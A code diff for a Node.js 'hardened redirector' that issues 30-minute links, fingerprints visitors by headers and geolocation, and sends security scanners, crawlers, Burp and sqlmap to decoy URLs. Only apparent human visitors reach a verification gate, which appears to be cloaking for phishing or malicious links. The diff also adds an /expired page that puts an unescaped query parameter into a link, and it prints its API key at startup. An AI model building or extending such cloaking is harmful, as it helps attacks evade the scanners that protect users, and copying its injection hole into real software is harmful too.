@@ -21,11 +21,15 @@ const BOT_URLS     = [
 ];
 
 const LOG_FILE     = 'clicks.log';
+const REQUEST_LOG_FILE = 'requests.log';
 const PORT         = process.env.PORT || 10000;
-const LINK_TTL_SEC = 1800;
+const LINK_TTL_SEC = 1800; // 30 minutes
+const METRICS_API_KEY = process.env.METRICS_API_KEY || crypto.randomBytes(32).toString('hex');
 
-const geoCache  = new NodeCache({ stdTTL: 86400 });
+const geoCache  = new NodeCache({ stdTTL: 86400 }); // 24 hours
 const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC });
+const linkRequestCache = new NodeCache({ stdTTL: 60 }); // 1 minute for rate limiting
+const failCache = new NodeCache({ stdTTL: 3600 }); // 1 hour for failed geolocation
 
 // ─── Middleware ──────────────────────────────────────────────────────────────
 app.use((req, res, next) => {
@@ -49,7 +53,79 @@ app.use(helmet({
 app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
 
+// ─── Logging Helper ─────────────────────────────────────────────────────────
+function logRequest(type, req, extra = {}) {
+  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
+  const logEntry = {
+    timestamp: new Date().toISOString(),
+    type,
+    ip,
+    method: req.method,
+    path: req.path,
+    ua: (req.headers['user-agent'] || '').substring(0, 100),
+    ...extra
+  };
+  
+  fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n', () => {});
+  console.log(`[${type}] ${ip} ${req.path} ${JSON.stringify(extra)}`);
+}
+
+// ─── Health Endpoints ───────────────────────────────────────────────────────
 app.get(['/ping','/health','/healthz','/status'], (_, res) => res.status(200).send('OK'));
+
+// ─── Metrics Endpoint (Protected) ───────────────────────────────────────────
+app.get('/metrics', (req, res) => {
+  const apiKey = req.headers['x-api-key'];
+  if (apiKey !== METRICS_API_KEY) {
+    return res.status(403).send('Forbidden');
+  }
+
+  const stats = {
+    activeLinks: linkCache.keys().length,
+    geoCacheSize: geoCache.keys().length,
+    linkRequestCacheSize: linkRequestCache.keys().length,
+    failCacheSize: failCache.keys().length,
+    uptime: process.uptime(),
+    memory: process.memoryUsage(),
+    timestamp: new Date().toISOString(),
+    config: {
+      linkTtlSec: LINK_TTL_SEC,
+      botThreshold: 75,
+      mobileBotThreshold: 85
+    }
+  };
+  
+  res.json(stats);
+});
+
+// ─── Expired Link Page ──────────────────────────────────────────────────────
+app.get('/expired', (req, res) => {
+  const originalTarget = req.query.target || BOT_URLS[0];
+  res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Link Expired</title>
+  <style>
+    body{font-family:sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+    .card{background:white;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;max-width:400px}
+    .btn{background:#0f0;color:#000;padding:0.75rem 1.5rem;border-radius:4px;text-decoration:none;display:inline-block;margin-top:1rem;font-weight:bold}
+    .btn:hover{background:#0c0}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🔗 Link Expired</h1>
+    <p>This verification link has expired. Links are valid for ${LINK_TTL_SEC/60} minutes.</p>
+    <p>Please request a new link to continue.</p>
+    <a href="${originalTarget}" class="btn">Go to Site</a>
+  </div>
+</body>
+</html>
+  `);
+});
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
 const isMobile = req => /Mobi|Android|iPhone|iPad|iPod/i.test(req.headers['user-agent'] || '');
@@ -65,16 +141,35 @@ function isLikelyBot(req) {
   const ua = (req.headers['user-agent'] || '').toLowerCase();
   const h  = req.headers;
   let score = 0;
+  const reasons = [];
 
-  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap/i.test(ua)) score += 50;
-  if (!ua.includes('mozilla')) score += 30;
-  if (!h['sec-ch-ua'] || !h['sec-ch-ua-mobile'] || !h['sec-ch-ua-platform']) score += 35;
-  if (!h['accept-language'] || h['accept-language'].length < 5) score += 20;
-  if (Object.keys(h).length < 11) score += 25;
+  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap/i.test(ua)) {
+    score += 50;
+    reasons.push('bot_ua');
+  }
+  if (!ua.includes('mozilla')) {
+    score += 30;
+    reasons.push('non_mozilla');
+  }
+  if (!h['sec-ch-ua'] || !h['sec-ch-ua-mobile'] || !h['sec-ch-ua-platform']) {
+    score += 35;
+    reasons.push('missing_sec_headers');
+  }
+  if (!h['accept-language'] || h['accept-language'].length < 5) {
+    score += 20;
+    reasons.push('missing_accept_language');
+  }
+  if (Object.keys(h).length < 11) {
+    score += 25;
+    reasons.push('minimal_headers');
+  }
 
-  console.log(`[BOT-SCORE] ${score} | UA:${ua.substring(0,80)}... | Mobile:${isMobile(req)}`);
+  const botThreshold = isMobile(req) ? 85 : 75;
+  const isBot = score >= botThreshold;
+  
+  console.log(`[BOT-SCORE] ${score} | ${reasons.join(',') || 'clean'} | Threshold:${botThreshold} | IsBot:${isBot} | UA:${ua.substring(0,80)}... | Mobile:${isMobile(req)}`);
 
-  return score >= 75;
+  return isBot;
 }
 
 async function getCountryCode(req) {
@@ -87,14 +182,26 @@ async function getCountryCode(req) {
     return cc;
   }
 
+  // Track failed lookups to avoid hammering the API
+  const failKey = `fail:${ip}`;
+  if (failCache.get(failKey) >= 3) {
+    console.log(`[GEO-SKIP] ${ip} too many failures`);
+    return 'XX';
+  }
+
   try {
     const token = process.env.IPINFO_TOKEN;
     if (!token) return 'XX';
 
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 3500);
+
     const res = await fetch(`https://ipinfo.io/${ip}/json?token=${token}`, {
-      timeout: 3500,
+      signal: controller.signal,
       headers: { 'User-Agent': 'redir/1.0' }
     });
+
+    clearTimeout(timeout);
 
     if (res.ok) {
       const data = await res.json();
@@ -104,9 +211,14 @@ async function getCountryCode(req) {
         console.log(`[GEO-FETCH] ${ip} → ${cc}`);
         return cc;
       }
+    } else {
+      // Track failed status codes
+      failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
+      console.log(`[GEO-ERR] ${ip} → HTTP ${res.status}`);
     }
   } catch (err) {
     console.log(`[GEO-ERR] ${ip} → ${err.message}`);
+    failCache.set(failKey, (failCache.get(failKey) || 0) + 1);
   }
 
   return 'XX';
@@ -215,21 +327,38 @@ app.get('/g', (req, res) => {
   const url = `https://${req.hostname}/v/${id}`;
   console.log(`[GENERATED] ${url} → ${target.substring(0,60)}...`);
 
+  logRequest('GENERATE', req, { linkId: id, target: target.substring(0, 60) });
   res.json({ success: true, url });
 });
 
 // ─── Verification gate ───────────────────────────────────────────────────────
 app.get('/v/:id', strictLimiter, async (req, res) => {
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '??';
+  const linkId = req.params.id;
+  
+  // Check for excessive requests to the same link
+  const linkKey = `${linkId}:${ip}`;
+  const requestCount = linkRequestCache.get(linkKey) || 0;
+  
+  if (requestCount >= 3) { // Max 3 requests per minute per IP per link
+    console.log(`[RATE-LIMIT] ${ip} attempted ${linkId} ${requestCount+1} times`);
+    logRequest('RATE_LIMIT', req, { linkId, count: requestCount + 1 });
+    const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
+    return res.redirect(safe);
+  }
+  
+  linkRequestCache.set(linkKey, requestCount + 1);
+
   const country = await getCountryCode(req);
   const ua = req.headers['user-agent'] || '';
 
-  console.log(`[ACCESS] /v/${req.params.id} | IP:${ip} | CC:${country} | UA:${ua.substring(0,80)}...`);
+  logRequest('ACCESS', req, { linkId, country, requestCount: requestCount + 1 });
 
   if (isLikelyBot(req)) {
     fs.appendFile(LOG_FILE, `${new Date().toISOString()} BOT ${ip} ${country}\n`, ()=>{});
     const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
     console.log(`[BLOCK] Bot → ${safe}`);
+    logRequest('BLOCK', req, { linkId, country, reason: 'bot_detected', redirectTo: safe });
     return res.redirect(safe);
   }
 
@@ -238,7 +367,8 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
   const data = linkCache.get(req.params.id);
   if (!data) {
     console.log(`[EXPIRED] ${req.params.id}`);
-    return res.redirect(BOT_URLS[0]);
+    logRequest('EXPIRED', req, { linkId, country });
+    return res.redirect(`/expired?target=${encodeURIComponent(BOT_URLS[0])}`);
   }
 
   const hpSuffix = crypto.randomBytes(5).toString('hex');
@@ -338,8 +468,15 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
 </html>`);
 });
 
-app.use((_, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));
+// ─── 404 Handler ─────────────────────────────────────────────────────────────
+app.use((_, res) => {
+  const safe = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
+  res.redirect(safe);
+});
 
+// ─── Start Server ────────────────────────────────────────────────────────────
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`[STARTUP] Hardened redirector listening on ${PORT}`);
+  console.log(`[STARTUP] Metrics API key: ${METRICS_API_KEY}`);
+  console.log(`[STARTUP] Links expire after ${LINK_TTL_SEC/60} minutes`);
 });
